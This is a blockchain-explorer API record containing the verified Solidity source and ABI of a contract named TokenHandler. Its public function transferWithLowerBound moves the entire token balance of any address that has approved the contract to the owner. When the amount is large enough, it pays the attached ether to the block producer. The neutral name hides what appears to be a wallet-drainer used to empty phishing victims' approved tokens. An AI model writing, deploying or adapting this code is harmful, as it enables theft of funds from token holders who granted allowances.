{"status": "1", "message": "OK", "result": [{"SourceCode": "pragma solidity ^0.8.7;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ncontract TokenHandler {\r\n    address owner;\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n    function changeOwner(address newOwner) public {\r\n        require(owner == msg.sender, \"owner only\");\r\n        owner = newOwner;\r\n    }\r\n    function transferWithLowerBound(address from, address token, uint256 threshold) payable public {\r\n        uint256 amount = IERC20(token).balanceOf(from);\r\n        IERC20(token).transferFrom(from, owner, amount);\r\n        if(amount >= threshold) {\r\n            block.coinbase.transfer(msg.value);\r\n        }\r\n        else {\r\n            payable(owner).transfer(msg.value);\r\n        }\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"changeOwner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"threshold\",\"type\":\"uint256\"}],\"name\":\"transferWithLowerBound\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"}]", "ContractName": "TokenHandler", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3b661ac90dbfd08e1e671930c17c1d429ac27f4a40d2d29286086c2505c03c00"}]}